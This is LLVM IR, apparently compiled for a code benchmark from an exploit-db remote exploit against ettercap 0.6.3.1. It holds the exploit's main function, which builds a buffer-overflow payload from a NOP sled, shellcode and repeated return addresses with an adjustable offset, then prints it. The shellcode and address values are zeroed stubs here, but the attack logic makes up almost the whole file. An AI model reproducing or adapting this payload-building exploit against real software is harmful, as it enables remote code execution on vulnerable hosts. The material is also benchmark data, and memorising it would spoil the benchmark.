; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21289.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21289.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFF_SIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [66 x i8] c"ettercap-0.6.3.1 xploit by Ferm\EF\BF\BDn J. Serna <fjserna@ngsec.com>\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Next Generation Security Technologies\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"http://www.ngsec.com\0A\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@NUM_ADDR = common dso_local global i32 0, align 4
@RET_ADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFF_SIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = load i32, i32* @OFFSET, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %21 = load i32, i32* @stderr, align 4
  %22 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = icmp eq i32 %23, 2
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  store i32 %29, i32* %11, align 4
  br label %30

30:                                               ; preds = %25, %2
  %31 = trunc i64 %13 to i32
  %32 = call i32 @memset(i8* %15, i32 0, i32 %31)
  store i8* %15, i8** %8, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = load i32, i32* @NOP, align 4
  %35 = load i32, i32* @shellcode, align 4
  %36 = call i32 @strlen(i32 %35)
  %37 = sext i32 %36 to i64
  %38 = sub i64 %13, %37
  %39 = load i32, i32* @NUM_ADDR, align 4
  %40 = mul nsw i32 4, %39
  %41 = sext i32 %40 to i64
  %42 = sub i64 %38, %41
  %43 = trunc i64 %42 to i32
  %44 = call i32 @memset(i8* %33, i32 %34, i32 %43)
  %45 = load i32, i32* @shellcode, align 4
  %46 = call i32 @strlen(i32 %45)
  %47 = sext i32 %46 to i64
  %48 = sub i64 %13, %47
  %49 = load i32, i32* @NUM_ADDR, align 4
  %50 = mul nsw i32 4, %49
  %51 = sext i32 %50 to i64
  %52 = sub i64 %48, %51
  %53 = load i8*, i8** %8, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 %52
  store i8* %54, i8** %8, align 8
  %55 = load i8*, i8** %8, align 8
  %56 = load i32, i32* @shellcode, align 4
  %57 = load i32, i32* @shellcode, align 4
  %58 = call i32 @strlen(i32 %57)
  %59 = call i32 @memcpy(i8* %55, i32 %56, i32 %58)
  %60 = load i32, i32* @shellcode, align 4
  %61 = call i32 @strlen(i32 %60)
  %62 = load i8*, i8** %8, align 8
  %63 = sext i32 %61 to i64
  %64 = getelementptr inbounds i8, i8* %62, i64 %63
  store i8* %64, i8** %8, align 8
  %65 = load i8*, i8** %8, align 8
  %66 = bitcast i8* %65 to i64*
  store i64* %66, i64** %9, align 8
  store i32 0, i32* %10, align 4
  br label %67

67:                                               ; preds = %78, %30
  %68 = load i32, i32* %10, align 4
  %69 = load i32, i32* @NUM_ADDR, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %81

71:                                               ; preds = %67
  %72 = load i32, i32* @RET_ADDR, align 4
  %73 = load i32, i32* %11, align 4
  %74 = add nsw i32 %72, %73
  %75 = sext i32 %74 to i64
  %76 = load i64*, i64** %9, align 8
  %77 = getelementptr inbounds i64, i64* %76, i32 1
  store i64* %77, i64** %9, align 8
  store i64 %75, i64* %76, align 8
  br label %78

78:                                               ; preds = %71
  %79 = load i32, i32* %10, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %10, align 4
  br label %67

81:                                               ; preds = %67
  %82 = load i64*, i64** %9, align 8
  %83 = bitcast i64* %82 to i8*
  store i8* %83, i8** %8, align 8
  %84 = load i8*, i8** %8, align 8
  store i8 0, i8* %84, align 1
  %85 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %15)
  store i32 0, i32* %3, align 4
  %86 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %86)
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
